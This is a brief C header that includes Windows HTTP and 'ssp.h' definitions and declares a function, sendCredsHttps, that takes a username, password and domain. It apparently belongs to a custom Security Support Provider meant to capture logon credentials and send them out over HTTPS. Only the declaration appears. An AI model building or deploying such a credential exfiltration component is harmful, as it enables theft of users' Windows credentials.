#pragma once
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include "ssp.h"

#pragma comment(lib, "winhttp.lib")

BOOL sendCredsHttps(LPWSTR username, LPWSTR password, LPWSTR domain);